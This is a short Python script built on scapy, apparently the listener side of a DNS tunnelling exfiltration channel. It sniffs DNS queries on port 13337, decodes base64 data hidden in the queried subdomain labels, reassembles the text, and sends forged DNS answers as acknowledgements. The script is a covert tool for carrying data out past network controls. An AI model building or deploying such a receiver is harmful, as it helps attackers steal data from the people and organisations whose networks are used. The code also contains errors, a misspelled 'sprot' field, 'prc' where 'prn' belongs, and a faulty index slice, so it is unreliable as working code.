from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.packet import Packet
from scapy.layers.dns import DNS, DNSRR
from scapy.sendrecv import send, sniff

from scapy.all import *  # noqa: F403
from base64 import b64decode

port = 13337


def sendResponse(query: Packet, ip):
    question = query[DNS].qd
    answer = DNSRR(rrname=question.qname, ttl=1000, rdata=ip)
    ip = IP(src=query[IP].dst, dst=query[IP].src)

    dns = DNS(id=query[DNS].id, qr=1, qdcount=1, ancount=1, qd=query[DNS].qd, an=answer)

    if query.haslayer(UDP):
        udp = UDP(dport=query[UDP].sport, sprot=port)
        response = ip / udp / dns
    elif query.haslayer(TCP):
        tcp = TCP(dport=query[TCP].sport, sport=port)
        response = ip / tcp / dns
    else:
        return

    send(response, verbose=0)


extracted = ""


def extractData(x: Packet):
    global extracted
    if x.haslayer(DNS) and not x.haslayer(ICMP):
        if x.haslayer(UDP):
            if not x[UDP].dport == port:
                return
        elif x.haslayer(TCP):
            if not x[TCP].dport == port:
                return
        domain = x[DNS].qd.qname

        data_index = domain.index(bytes(".", "utf-8"))
        data = domain[:data_index]

        tracking_index = domain[data_index:].index(bytes(".", "utf-8"))
        tracker = domain[data_index:tracking_index]

        padnum = (4 - (len(data) % 4)) % 4
        data += bytes("=" * padnum, "utf-8")

        try:
            decoded = b64decode(data).decode("utf-8")
            print(f"Received: {decoded}")
            if decoded == "R":
                sendResponse(x, f"10.0.{tracker}.2")
                print("End Transmission")
                print(extracted)
                extracted = ""
            else:
                extracted += decoded
                sendResponse(x, f"10.0.{tracker}.1")
        except Exception as e:
            print(e)
            sendResponse(x, "10.0.0.0")


sniff(prc=extractData)
